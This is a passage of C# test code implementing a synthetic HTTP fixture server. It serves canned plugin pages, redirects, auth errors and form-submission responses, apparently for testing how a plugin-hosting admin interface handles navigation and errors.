                        try { await Task.Delay(Timeout.Infinite, linked.Token); } catch (OperationCanceledException) { }
                        return;
                    }
                    else if (path.StartsWith("/api/v2/plugin-content/", StringComparison.Ordinal) && mode is "401" or "403" or "404" or "500" && path.EndsWith("/custom", StringComparison.Ordinal))
                    { status = int.Parse(mode); type = "text/plain"; text = "Synthetic raw plugin error text"; }
                    else if (path.StartsWith("/api/v2/plugin-content/", StringComparison.Ordinal) && !launchCookie)
                    { status = 401; type = "text/plain"; text = "unauthorized"; }
                    else if (path is "/api/v2/plugin-content/plugins/7/custom" or "/api/v2/plugin-content/plugins/8/tools")
                    { status = 308; extra = "Location: " + path + "/\r\n"; }
                    else if (path is "/api/v2/plugin-content/plugins/7/custom/" or "/api/v2/plugin-content/plugins/8/tools/")
                        // The second installation's page sets its fragment before it has loaded (a same-document navigation while opening),
                        // twice in the "twice" mode.
                        text = """<!doctype html><html><head>__OPENING__<script src="./page.js" defer></script></head><body><h1>Synthetic Admin Plugin</h1><img src="/api/v2/plugin-content/plugin-assets/7/pixel.svg"><form method="post" action="./submitted"><input name="value" value="synthetic"><button id="submit">Submit once</button></form></body></html>"""
                            .Replace("__OPENING__", !path.EndsWith("/tools/", StringComparison.Ordinal) ? ""
                                : mode == "twice" ? "<script>window.location.hash = 'first'; window.location.hash = 'second';</script>"
                                : "<script>window.location.hash = 'opening';</script>");
                    else if (path.EndsWith("/page.js", StringComparison.Ordinal))
                    { type = "text/javascript"; text = "fetch('./probe').then(r => { if(r.ok) document.body.dataset.ready='yes'; });"; }
                    else if (path.EndsWith("/probe", StringComparison.Ordinal)) text = "ready";
                    else if (path == "/api/v2/plugin-content/plugin-assets/7/pixel.svg")
                    { type = "image/svg+xml"; text = "<svg xmlns='http://www.w3.org/2000/svg' width='1' height='1'/>"; }
                    else if (path.EndsWith("/submitted", StringComparison.Ordinal) && method == "POST")
                    { Interlocked.Increment(ref Writes); text = "<html><body data-submitted='yes'>Submitted</body></html>"; }
                    else { status = 404; text = "Outside fixture contract"; }
                    var body = Encoding.UTF8.GetBytes(text);
                    var response = Encoding.ASCII.GetBytes($"HTTP/1.1 {status} Fixture\r\nContent-Type: {type}\r\nContent-Length: {body.Length}\r\nCache-Control: no-store\r\n{extra}Connection: close\r\n\r\n");
                    await stream.WriteAsync(response, _stop.Token); await stream.WriteAsync(body, _stop.Token);
                }
                catch (IOException) { } catch (OperationCanceledException) { } catch (SocketException) { }
            }
        }
        public async ValueTask DisposeAsync()
        { _stop.Cancel(); _hangs.Cancel(); _listener.Stop(); await _loop; await Task.WhenAll(_connections.ToArray()); _stop.Dispose(); }
    }
}
